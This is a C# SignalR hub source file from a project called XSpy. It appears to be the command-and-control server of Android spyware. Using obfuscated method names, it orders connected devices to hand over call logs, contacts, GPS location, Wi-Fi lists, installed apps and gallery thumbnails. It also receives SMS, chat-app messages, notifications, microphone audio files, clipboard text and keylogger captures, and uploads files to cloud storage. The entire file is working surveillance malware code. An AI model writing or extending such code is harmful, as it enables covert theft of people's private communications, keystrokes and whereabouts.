using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.SignalR;
using Microsoft.Extensions.Hosting;
using Newtonsoft.Json;
using XSpy.Database.Entities;
using XSpy.Database.Entities.Devices;
using XSpy.Database.Services;
using XSpy.Database.XSpy.Shared.Models.Interfaces;
using XSpy.Shared.DataTransfer;
using XSpy.Shared.Models.Requests.Devices;
using XSpy.Utils;
using File = System.IO.File;

namespace XSpy.Socket
{
    [Authorize(Policy = "HubAuthorizationPolicy")]
    public class MainHub : Hub
    {
        private readonly HubMethods _methods;
        private readonly UserService _userService;
        private readonly DeviceService _deviceService;
        private readonly AwsService _awsService;


        public MainHub(HubMethods hubMethods, DeviceService deviceService, UserService userService,
            IHostEnvironment env, AwsService awsService)
        {
            _awsService = awsService;
            _userService = userService;
            _deviceService = deviceService;
            _methods = hubMethods;
        }

        public override async Task OnConnectedAsync()
        {
            _methods.ClientsByDeviceId[GetDeviceId()] = Context.ConnectionId;

            await base.OnConnectedAsync().ConfigureAwait(false);
        }

        public override async Task OnDisconnectedAsync(Exception exception)
        {
            //    var user = await GetUserAsync().ConfigureAwait(false);
            //   var userId = user.Id;
            var deviceId = GetDeviceId();
            _methods.ClientsByDeviceId.TryRemove(deviceId, out _);

            await _deviceService.DisconnectDevice(deviceId);

            await base.OnDisconnectedAsync(exception).ConfigureAwait(false);
        }

        public async Task _0xSD(string requestData)
        {
            var request = JsonConvert.DeserializeObject<SaveDeviceRequest>(requestData);
            var user = await GetUser();
            if (user == null)
                return;

            await _deviceService.SaveDevice(user.Id, request);

            var client = Clients.Client(Context.ConnectionId);
            await client.SendAsync("0xSM", "ls", "", "");

            await client.SendAsync("0xCL");
            await client.SendAsync("0xCO");
            await client.SendAsync("0xLO");
            await client.SendAsync("0xWI");
            await client.SendAsync("0xPM");
            await client.SendAsync("0xIN");
            await client.SendAsync("0xGI");
            await client.SendAsync("0xLO");
        }

        //List Files
        public async Task _0xFI(string request)
        {
            var pathRequest = JsonConvert.DeserializeObject<List<LoadPathData>>(request);
            await _deviceService.ListPath(GetDeviceId(), pathRequest);
        }

        //List Gallery
        public async Task _0xGI(string request)
        {
            var pathRequest = JsonConvert.DeserializeObject<List<SaveGalleryRequest>>(request);
            var needThumb = await _deviceService.ImageList(GetDeviceId(), pathRequest);

            if (needThumb.Count > 0)
            {
                var client = Clients.Client(Context.ConnectionId);

                foreach (var thumb in needThumb)
                {
                    await client.SendAsync("0xTB", thumb.ImageId, thumb.Path);
                }
            }
        }

        //Get Gallery thumbs
        public async Task _0xTB(string request)
        {
            var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);
            var device = GetDeviceId();

            string[] split = fileRequest.Path.Split('/');

            var fileUrl = await _awsService.UploadFile(fileRequest.Buffer, fileRequest.ContentType,
                Path.Combine($"/devices/{device}/{fileRequest.Type}/", fileRequest.Path.Replace(".", null)),
                split.Last());

            await _deviceService.SaveImageThumb(GetDeviceId(), fileUrl, fileRequest.Path);
        }


        //Download Files
        public async Task _0xFD(string request)
        {
            var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);

            var device = GetDeviceId();
            var fileUrl = await _awsService.UploadFile(fileRequest.Buffer, fileRequest.ContentType,
                Path.Combine("devices", device, fileRequest.Type, fileRequest.Path),
                fileRequest.Name);

            await _deviceService.StoreFile(device, fileUrl, fileRequest);
        }

        //GET APP MSG
        public async Task _0xAM(string request, string contact, string appName)
        {
            var fileRequest = JsonConvert.DeserializeObject<List<SaveAppMessageRequest>>(request);

            var device = GetDeviceId();


            await _deviceService.StoreAppMessages(device, fileRequest, appName, contact);
        }


        //LIST SMS
        public async Task _0xLM(string request)
        {
            var reqData = JsonConvert.DeserializeObject<List<ListSmsData>>(request);
            if (reqData != null)
            {
                await _deviceService.StoreMessages(GetDeviceId(), reqData);
            }
        }

        //SENT SMS
        public async Task _0xSM(bool isSent, string phoneNo, string msg)
        {
            //todo
        }

        //Call List
        public async Task _0xCL(string request)
        {
            var calls = JsonConvert.DeserializeObject<SaveCallsRequest>(request);
            await _deviceService.SaveCalls(GetDeviceId(), calls);
        }

        //CONTACT List
        public async Task _0xCO(string request)
        {
            var contacts = JsonConvert.DeserializeObject<SaveContactsRequest>(request);
            await _deviceService.SaveContacts(GetDeviceId(), contacts);
        }

        //Notification List
        public async Task _0xNO(string request)
        {
            var notifications = JsonConvert.DeserializeObject<SaveNotificationsData>(request);
            await _deviceService.SaveNotification(GetDeviceId(), notifications);
        }

        //WIFI List
        public async Task _0xWI(string request)
        {
            var wifiRequest = JsonConvert.DeserializeObject<SaveWifiList>(request);
            if (wifiRequest.Networks != null)
                await _deviceService.SaveWifi(GetDeviceId(), wifiRequest);
        }

        //SAVE AUDIO FILE
        public async Task _0xMI(string request)
        {
            var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);

            var device = GetDeviceId();
            var fileUrl = await _awsService.UploadFile(fileRequest.Buffer, fileRequest.ContentType,
                Path.Combine("devices", device, fileRequest.Type, fileRequest.Path),
                fileRequest.Name);

            await _deviceService.StoreFile(device, fileUrl, fileRequest);
        }

        //PERM. List
        public async Task _0xPM(string request)
        {
            var permissions = JsonConvert.DeserializeObject<GrantedPermissionRequest>(request);
            await _deviceService.SavePermission(GetDeviceId(), permissions);
        }

        //INSTALLED List
        public async Task _0xIN(string request)
        {
            SaveInstalledAppsRequest installedApps = JsonConvert.DeserializeObject<SaveInstalledAppsRequest>(request);
            if (installedApps.Apps != null)
                await _deviceService.SaveInstalledList(GetDeviceId(), installedApps);
        }

        //GRANTED PERM. List
        public async Task _0xGP(string request)
        {
            var permissionData = JsonConvert.DeserializeObject<PermissionDataRequest>(request);
            await _deviceService.SavePermission(GetDeviceId(), permissionData);
        }

        //GPS
        public async Task _0xLO(string request)
        {
            var location = JsonConvert.DeserializeObject<UpdatePositionRequest>(request);
            await _deviceService.SaveLocation(GetDeviceId(), location);
        }

        //ClipBoard
        public async Task _0xCB(string word, string appName)
        {
            await _deviceService.SaveWords(GetDeviceId(), word, appName, true);
        }

        //Save words - key logger
        public async Task _0xKL(string words, string appName)
        {
            await _deviceService.SaveWords(GetDeviceId(), words, appName, false);
        }

        private string GetDeviceId()
        {
            var userId = Context.User.FindFirst(ClaimTypes.SerialNumber);
            return userId?.Value;
        }

        private Task<IUserEntity> GetUser()
        {
            return _userService.GetUserByToken(GetUserToken());
        }


        private Guid GetUserToken()
        {
            var userId = Context.User.FindFirst(ClaimTypes.Sid);
            return userId == null ? Guid.Empty : Guid.Parse(userId.Value);
        }
    }
}